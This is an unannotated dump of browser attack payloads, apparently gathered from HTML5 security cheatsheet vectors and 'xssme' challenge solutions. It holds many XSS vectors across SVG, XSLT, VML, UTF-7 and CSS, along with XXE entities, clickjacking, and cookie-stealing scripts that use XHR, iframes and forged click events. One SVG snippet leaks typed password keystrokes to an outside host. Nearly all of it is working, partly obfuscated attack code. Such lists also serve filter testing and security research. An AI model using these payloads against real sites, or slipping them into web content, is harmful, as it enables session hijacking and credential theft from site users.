<!-- Up to Opera 12.x --> <div style="background:url(test5.svg)">PRESS ENTER</div><form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)"> <!-- this file can be crossdomain if "action" attribute refers to an external file --> <meta http-equiv="refresh" content="1;URL=test5.svg"/> <input type="submit" autofocus="autofocus"/> </form><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div><div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>XXX<style> *{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */ <!-- --><!--*{color:red} /* all UA */ *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */ </style>ession\28write(1)\29>ground:red}]{background:green};</style></script><img[a][b]src=x[d]onerror[c]=[e]"alert(1)"><a href="[a]java[b]script[c]:alert(1)">XXX</a<img src="x` `<script>alert(1)</script>"` `>
  <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div><div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style><x style="background:url('x[a];color:red;/*')">XXX</x><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script><script>({0:#0=alert/#0#/#0#(0)})</script><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script><script>history.pushState(0,0,'/i/am/somewhere_else');</script><script src="#">{alert(1)}</script>;1+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);<b><script<b></b><alert(1)</script </b></b><script<{alert(1)}/></script </>0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg><?xml version="1.0" standalone="no"?> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <style type="text/css"> @font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";} </style> </head> <body>Hello</body> </html>

<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg><svg xmlns="http://www.w3.org/2000/svg"> <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:alert(1)"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:alert(1)"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/> </svg><svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="alert(1)"/> <animate attributeName="onunload" to="alert(1)"/> </svg><svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg><svg xmlns="http://www.w3.org/2000/svg" id="foo"> <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/> </svg><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe><svg xmlns="http://www.w3.org/2000/svg"> <a id="x"><rect fill="white" width="1000" height="1000"/></a> <rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <clipPath id="a" > <set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" /> </clipPath> <pattern id="b"> <set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" /> </pattern> <filter id="c"> <set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" /> </filter> <marker id="d"> <set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(1)" /> </marker> <mask id="e"> <set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(2)" /> </mask> <linearGradient id="f"> <set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(3)" /> </linearGradient> </svg><svg xmlns="http://www.w3.org/2000/svg"> <path d="M0,0" style="marker-start:url(test4.svg#a)"/> </svg>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <marker id="a" markerWidth="1000" markerHeight="1000" refX="0" refY="0"> <a xlink:href="http://google.com"> <set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" /> <rect width="1000" height="1000" fill="white"/> </a> </marker> </svg><?xml version="1.0"?> <?xml-stylesheet type="text/xml" href="#stylesheet"?> <!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]> <svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle> </svg><svg xmlns="http://www.w3.org/2000/svg" id="x"> <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/> <handler id="y">alert(1)</handler> </svg><svg><style>&lt;img/src=x onerror=alert(1)// </b><svg> <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'> <!-- Same effect with <image filter='...'> --> </svg><!doctype html> <form> <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label> <br> <input name="secret" type="password"> </form> <!-- injection --><svg height="50px"> <image xmlns:xlink="http://www.w3.org/1999/xlink"> <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /> <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /> <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /> <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /> </image> </svg><?xml-stylesheet href="javascript:alert(1)"?><root/><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script><?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?> <root/><!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)"> ]><img /><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x> </doc><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>

<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;"><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>

<?xml version="1.0"?> <Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data"> <ElementType name="img"> <AttributeType name="src" required="yes" default="x"/> <AttributeType name="onerror" required="yes" default="alert(1)"/> <attribute type="src"/> <attribute type="onerror"/> </ElementType> </Schema><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?><x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>

<script xmlns="http://www.w3.org/1999/xhtml" id="x">alert(1)</script><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&><meta charset="x-mac-farsi">¼script ¾alert(1)//¼/script ¾<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!><input onblur=focus() autofocus><input>X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe><xml> <rect style="height:100%;width:100%" id="xss" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a><x style="behavior:url(test.sct)"><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS> <SCRIPT Language="javascript">alert(1)</SCRIPT> </SCRIPTLET><xml id="xss" src="test.htc"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label><?xml version="1.0"?> <x> <payload><![CDATA[<img src=x onerror=alert(1)>]]></payload> </x><event-source src="event.php" onload="alert(1)"><?php header("Content-Type: application/x-dom-event-stream"); die("Event: load\ndata: \n\n"); ?><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a><div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;"><a href="http://attacker.org"> <iframe src="http://example.org/"></iframe> </a><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"> <h1>Drop me</h1> </div> <iframe src="http://www.example.org/dropHere.html"></iframe><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe> <textarea type="text" cols="50" rows="10"></textarea><script> function makePopups(){ for (i=1;i<6;i++) { window.open('popup.html','spam'+i,'width=50,height=50'); } } </script> <body> <a href="#" onclick="makePopups()">Spam</a><html xmlns="http://www.w3.org/1999/xhtml" xmlns:svg="http://www.w3.org/2000/svg"> <body style="background:gray"> <iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/> <svg:svg> <svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"> <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/> <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/> </svg:mask> </svg:svg> </body> </html><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe><span class=foo>Some text</span> <a class=bar href="http://www.example.org">www.example.org</a> <script src="http://code.jquery.com/jquery-1.4.4.js"></script> <script> $("span.foo").click(function() { alert('foo'); $("a.bar").click(); }); $("a.bar").click(function() { alert('bar'); location="http://html5sec.org"; }); </script><b>drag and drop one of the following strings to the drop box:</b> <br/><hr/> jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b> <br/><hr/> feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
======
\"%29%29;}catch%28e%29{alert%28document.domain%29;}//<img src=x onerror=prompt(0);>
<iframe/onload=prompt(0);>
<svg/onload=prompt(0);> 
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>">
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>">
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>">
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>">
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>">
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>">
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>">
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>">
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>">
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>">
<script>alert(document.head.innerHTML.substr(146,20));</script>">
<script>alert(document.head.childNodes[3].text)</script>">
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>">
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>">
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>">
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>">
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>">
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>">
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>">
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>">
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>">
<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> ">
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #">
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # ">
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#">
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#">
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23">
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>">
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>">
<hr>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>">
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#">
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>">
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>">
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>">
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">

<hr>

%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E">
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>">
<li><a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E">
<li><a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>">
